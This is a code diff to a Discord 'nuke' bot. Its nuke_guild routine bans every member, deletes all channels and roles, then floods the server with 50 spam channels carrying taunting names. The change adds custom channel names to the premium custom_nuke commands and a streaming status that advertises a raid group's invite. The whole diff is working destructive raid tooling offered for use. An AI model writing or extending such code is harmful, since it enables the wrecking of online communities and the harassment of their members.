@@ -82,15 +82,18 @@ async def spam_task(channel, message, count=None):
                 await asyncio.sleep(0.5)
             except: break
 
-async def nuke_guild(guild, custom_message=None):
+async def nuke_guild(guild, custom_message=None, custom_channel_name=None):
     msg = custom_message or SPAM_MESSAGE
     await ban_all_members(guild)
     await delete_all_channels(guild)
     await delete_all_roles(guild)
-    names = ["[😂] 𝐆𝐄𝐓𝐁𝐀𝐂𝐊", "[☠️] 𝟕𝟔𝟐𝐇𝐔𝐑𝐓", "[😭] 𝐅𝐊𝐃 𝐁𝐘 𝐖𝐄𝐏𝐀𝐈𝐃", "[🤑] 𝐖𝐄 𝐎𝐖𝐍 𝐘𝐎𝐔"]
+    
+    default_names = ["[😂] 𝐆𝐄𝐓𝐁𝐀𝐂𝐊", "[☠️] 𝟕𝟔𝟐𝐇𝐔𝐑𝐓", "[😭] 𝐅𝐊𝐃 𝐁𝐘 𝐖𝐄𝐏𝐀𝐈𝐃", "[🤑] 𝐖𝐄 𝐎𝐖𝐍 𝐘𝐎𝐔"]
+    
     for _ in range(50):
         try:
-            channel = await guild.create_text_channel(name=random.choice(names))
+            name = custom_channel_name or random.choice(default_names)
+            channel = await guild.create_text_channel(name=name)
             asyncio.create_task(spam_task(channel, msg))
         except: continue
 
@@ -111,10 +114,19 @@ client = MyBot()
 async def on_ready():
     clear()
     print(baner)
+    
+    # Set streaming status
+    activity = discord.Streaming(
+        name=".gg/wepaid JOIN NOW",
+        url="https://www.twitch.org/4TBSPAAZ"
+    )
+    await client.change_presence(activity=activity)
+    
     print(f'''
 {c}--------------------------------------------
 {g}[+] Logged in as {client.user}
 {y}[!] Slash Commands Enabled
+{y}[!] Status: Streaming .gg/wepaid JOIN NOW
 {c}--------------------------------------------''')
 
 # --- Slash Commands ---
@@ -124,13 +136,13 @@ async def nuke_slash(interaction: discord.Interaction):
     await interaction.response.send_message("🚀 Nuke Started!", ephemeral=True)
     await nuke_guild(interaction.guild)
 
-@client.tree.command(name="custom_nuke", description="Full server nuke with custom message (Premium)")
-@app_commands.describe(message="Custom spam message")
-async def custom_nuke_slash(interaction: discord.Interaction, message: str):
+@client.tree.command(name="custom_nuke", description="Full server nuke with custom message & channel names (Premium)")
+@app_commands.describe(message="Custom spam message", channel_name="Custom channel names")
+async def custom_nuke_slash(interaction: discord.Interaction, message: str, channel_name: str = None):
     if not is_premium(interaction.user.id):
         return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
     await interaction.response.send_message("🚀 Custom Nuke Started!", ephemeral=True)
-    await nuke_guild(interaction.guild, message)
+    await nuke_guild(interaction.guild, message, channel_name)
 
 @client.tree.command(name="spam", description="Spam current channel (Premium)")
 @app_commands.describe(message="Message to spam", amount="How many times (blank for infinite)")
@@ -176,11 +188,11 @@ async def nuke(ctx):
     await nuke_guild(ctx.guild)
 
 @client.command()
-async def custom_nuke(ctx, *, message: str):
+async def custom_nuke(ctx, message: str, channel_name: str = None):
     if not is_premium(ctx.author.id):
         return await ctx.send("❌ Premium Only!")
     print(f'{y}[!] Custom Nuke command executed in {ctx.guild.name} by {ctx.author}')
-    await nuke_guild(ctx.guild, message)
+    await nuke_guild(ctx.guild, message, channel_name)
 
 @client.command()
 async def spam(ctx, amount: int, *, message: str):
